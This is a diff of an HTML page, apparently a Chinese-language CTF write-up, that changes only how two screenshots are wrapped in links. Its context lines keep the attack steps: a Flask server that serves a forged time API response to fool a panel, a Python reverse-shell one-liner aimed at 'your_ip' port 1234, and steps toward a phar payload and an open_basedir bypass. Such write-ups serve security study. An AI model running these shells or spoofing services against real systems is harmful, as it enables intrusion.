@@ -101,7 +101,7 @@
 <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/time'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fake_time</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify({<span class="string">"date"</span>:<span class="string">"2066-08-15 16:14:34"</span>,<span class="string">"weekday"</span>:<span class="string">"星期五"</span>,<span class="string">"timestamp"</span>:<span class="number">1755245674</span>,<span class="string">"remark"</span>:<span class="string">"任何情况请联系QQ:3295320658  微信服务号:顺成网络"</span>})</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">2333</span>)</span><br></pre></td></tr></tbody></table></figure>
 
 <p>修改api后进入面板</p>
-<p><img src="/images/image-20250821185856949.png" alt="image-20250821185856949" loading="lazy" decoding="async" width="1280" height="489"></p>
+<p><a class="article-image" href="/images/image-20250821185856949.png" data-fancybox="article" aria-label="查看原图"><img src="/images/image-20250821185856949.png" alt="image-20250821185856949" loading="lazy" decoding="async" width="1280" height="489"></a></p>
 <p>直接执行命令没有回显 试反弹shell</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'</span><br></pre></td></tr></tbody></table></figure>
 
@@ -143,7 +143,7 @@
 <p>生成的phar文件打包成gz</p>
 <figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip <span class="number">12</span>.phar</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/image-20250821190139046.png" alt="image-20250821190139046" loading="lazy" decoding="async" width="1280" height="715"></p>
+<p><a class="article-image" href="/images/image-20250821190139046.png" data-fancybox="article" aria-label="查看原图"><img src="/images/image-20250821190139046.png" alt="image-20250821190139046" loading="lazy" decoding="async" width="1280" height="715"></a></p>
 <p>源码phpini或者这里的环境都给了disablefunctions 几乎把所有禁完了</p>
 <p>提示</p>
 <p>​    // I hide a trick to bypass open_basedir, I’m sure you can find it.</p>
